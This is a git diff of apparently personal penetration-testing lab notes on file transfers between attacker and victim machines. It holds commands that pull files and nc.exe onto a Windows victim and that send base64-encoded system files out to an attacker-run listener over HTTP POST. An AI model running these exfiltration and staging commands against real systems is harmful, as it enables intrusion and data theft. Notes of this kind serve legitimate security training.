@@ -471,8 +471,8 @@ python3 ReconSpider.py http://inlanefreight.com
 you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
 ```
 ## File Transfers
-### Download Operations
-#### Windows File Transfer
+### Windows File Transfer
+#### Download Operations
 ##### PowerShell Base64 Encode & Decode
 ```
 A> md5sum id_rsa.txt
@@ -508,6 +508,13 @@ A> sudo impacket-smbserver share -smb2support /tmp/smbshare
 V> copy \\192.168.220.133\share\nc.exe
 A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 V> net use n: \\192.168.220.133\share /user:test test
+
+```
+##### FTP Downloads
+```
+A> sudo pip3 install pyftpdlib
+A> sudo python3 -m pyftpdlib --port 21
+V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 OR
 V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 V> C:\htb> echo USER anonymous >> ftpcommand.txt
@@ -525,14 +532,26 @@ V> ftp> bye
 V> C:\htb>more file.txt
 V> This is a test file
 ```
-##### FTP Downloads
+#### Upload Operations
+##### PowerShell Base64 Encode & Decode
 ```
-A> sudo pip3 install pyftpdlib
-A> sudo python3 -m pyftpdlib --port 21
-V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
-
+V> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+V> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+A> echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2lu
+ZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
 ```
-
+##### PowerShell Web Uploads
+```
+A> pip3 install uploadserver
+A> python3 -m uploadserver
+V> PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+-------------------------------------------------------------------------------------------------------------------
+A> nc -lvnp 8000
+V> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+V> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+A> echo <base64> | base64 -d -w 0 > hosts
+```
+##### SMB Uploads
 ## Shells
 
 ##### Reverse Shell
